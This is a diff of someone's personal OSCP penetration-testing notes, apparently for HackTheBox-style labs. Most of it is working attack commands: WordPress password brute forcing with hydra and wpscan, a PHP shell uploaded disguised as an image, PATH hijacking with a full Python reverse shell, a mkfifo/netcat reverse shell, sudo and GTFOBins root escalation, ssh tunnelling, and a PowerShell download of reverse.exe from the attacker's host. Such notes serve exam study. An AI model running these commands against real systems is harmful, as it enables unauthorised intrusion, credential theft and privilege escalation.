@@ -1,25 +1,12 @@
-PERSONAL OSCP NOTES
-==-==-==-==-==-==-==
-OSCP | GPEN | eCPTX | CREST CRT | eCPPTv2 | GWAPT | ECSA (Practical) | CREST CPSA | ACE
--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--==-=-= 
-self_awareness, happiness, workethic
-Reconnaissance
----------------
-
-Skip Tracing Framework
-	http://makensi.es/stf/
-
-www.traceroute.org
-www.kloth.net/services/traceroute.php
-www.tracert.com
-
-Red teaming roadmap
-CRTP > Offshore > Red Team Ops zeropointsecurity.co.uk > Rastalab > CRTE
+PERSONAL OSCP NOTES ~KUNAL PATEL
+==-==-==-==-==-==-==-==-==-==-==
 
 Cyberchef --> website that allows decoding and encoding of various stuffs like ssh(RSA,cipher),jpg etc
 
 
-
+===================================
+NMAP: Network Mapper (Port Scanner)
+===================================
 nmap -A -p- -T4 192.168.6.145
 nmap -sV 192.168.20.10-12 -oA bookversionnmap
 nmap -sS -T4 -A [IP]
@@ -240,14 +227,15 @@ to download files from victim machine to kali
 
 
 =================
-SNMP Enumeration
+SNMP Enumeration (PORT 161)
 =================
 snmp is common in windows machines
 
 snmpwalk -c public -v2c 10.10.10.116
 
 snmp-check 10.10.10.116
-
+ 
+onesixone 
 
 ==========
 ssh
@@ -267,8 +255,8 @@ Bruteforcing the ssh
 		-P is the word file
 		
 Copying Files from ssh shell
-Suppose there is a file inside victim machine name user.jpg which u need to copy to kali via ssh then use
 
+Suppose there is a file inside victim machine name user.jpg which u need to copy to kali via ssh then use
 	scp -i id_rsa willow@10.10.154.10:user.jpg flag.jpg	
 
 It saves user.jpg from victim machine to flag.jpg in kali
@@ -386,6 +374,16 @@ If server allows only .jpg files to be uploaded insert reverse shell into metada
 	And using burpsuit remove middle contents of image and add reverse shell php contents.
 	Also check param tab in burpsuit to make sure it's not leaking reverse shell contents.
 
+				Server provides image upload
+				Uploaded
+				 bird.php.jpeg 
+				 
+				 set up nc listner on kali
+				 
+				 then going to 
+				 10.10.10.185/image/uploads/bird.php.jpeg gives you shell
+
+
 
 Upload a reverse_shell file into vuln server 
  and connect to it
@@ -500,10 +498,19 @@ WORDPRESS BRUTEFORCE
 ====================
 hydra -l kunal -P /usr/share/wordlists/rockyou.txt 10.10.10.x http-post-form "/wp-login.php:log=kunal&pwd=^PASS^:ERROR
 
+Enumerates Users on Site 
+-----------------------
+wpscan --url http://wordy/  --enumerate u
+
+Bruteforcing WPSCAN giving password file and user list
+-------------------------------------------------------
+sudo wpscan --url http://wordy/ --passwords /home/kali/Desktop/kpasswords.txt --usernames /home/kali/Desktop/users.txt 
+
 wpscan --url http://192.168.0.18 --wordlist=/root/Downloads/fsocity.dic --username elliot
 
 wpscan --url http://192.168.6.145 -P /root/Downloads/fsocity.dic -U elliot
 
+wpscan --url http://wordy/ --password-attack wp-login
 ============
 mysql (3306)
 ============
@@ -526,6 +533,11 @@ show tables;         <---------Shows all the tables inside that flag database
 select * from key;   <----------- Shows everything from that key table
 
 
+if 3306 running and mysql not found
+try other 
+like mysqladmin
+	mysqldump --databases Magic -u theseus -p
+	etc
 ================
 priv escalation
 ================
@@ -548,6 +560,9 @@ uname -a (to get full kernel version)
 
 sudo -l (shows what current user can execute as root)
 
+bypass -u user restriction by appending another user
+sudo -u robert -u root cat /root/root.txt
+
 Distribution information is in
 	- etc/release
 	- etc/issue*
@@ -567,6 +582,18 @@ linuxprivchecker.py     linPrivchecker.sh     Linexploitchecker.sh
 
 Also use "pspy github" to check every running process on machine every sec (usefull for finding cron processes)
 
+---------------
+Exploiting PATH
+---------------
+suppose sysinfo running as root and it executes fdisk without path
+export PATH=/tmp:$PATH
+
+create a fdisk file having python rev shell and mv it to /tmp 
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.246",920));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+
+Set up another nc listner on 920 and u r root
+
+
 -------------
 MOTD Priv esc
 -------------
@@ -578,15 +605,14 @@ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.66 420 >/tm
 
 Now wait on nc -nvlp 420
 
+This was the reverse shell from pentest monkey ;)
 --------------------
 Gaining root via zip
 --------------------
 If sudo -l shows user can execute zip as a root
-
 use 
 
 sudo zip /tmp/kunal.zip /tmp/ -T --unzip-command="sh -c /bin/bash"
-
 
 and you are root
 
@@ -653,6 +679,35 @@ RVIM
 	!bash
 	id
 	
+sudo -l for weak permissions gives you root using GTFOBINS
+/bin/ash
+/usr/bin/awk
+/bin/bash
+/bin/sh
+/bin/csh
+/usr/bin/curl
+/bin/dash
+/bin/ed
+/usr/bin/env
+/usr/bin/expect
+/usr/bin/find
+/usr/bin/ftp
+/usr/bin/less
+/usr/bin/man
+/bin/more
+/usr/bin/scp
+/usr/bin/socat
+/usr/bin/ssh
+/usr/bin/vi
+/usr/bin/zsh
+/usr/bin/pico
+/usr/bin/rvim
+/usr/bin/perl
+/usr/bin/tclsh
+/usr/bin/git
+/usr/bin/script
+/usr/bin/scp
+
 -------------
 root via vim
 -------------
@@ -759,12 +814,18 @@ port forwarding
 ===============
 
 On victim if mysql is runnning on 127.0.0.1:3306 and u want to run it on kali then use ssh
-
+-------------------------------------------------------------------------------------------
 On victim
 	ssh -R 4444:127.0.0.1:3306 root@192.168.{KALI_IP}
 On kali
 	mysql -u root -h 127.0.0.1 -P 4444
-
+	
+	
+Tunnel the port running on victim machine to your localhost (using ssh) and access it using a browser:
+------------------------------------------------------------------------------------------------------
+On kali
+	ssh -L 52846:127.0.0.1:52846 jimmy@10.10.10.171
+	ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184
 ====
 GREP
 ====
@@ -782,7 +843,6 @@ To list only users from passwd file
 =======
 Strings
 =======
-
 strings *.sdf | more
 
 ========================
@@ -803,6 +863,7 @@ curl
 ====
 
 curl -d "username=jimmy&password=n1nj4W4rri0R!" -X POST http://localhost:52846/main.php
+	
 	Sends POST data with creds	
 
 ===============
@@ -823,3 +884,12 @@ to create a server on current directory
 
 python -m SimpleHTTPServer 800
 	Serving HTTP on 0.0.0.0 port 800 ...
+	
+OR 
+
+to transfer on windows using powershell
+	kali	
+		python -m SimpleHTTPServer
+	Windows
+		powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.9.122.8/reverse.exe','C:\Users\jarrieta\Desktop\reverse.exe')"
+		
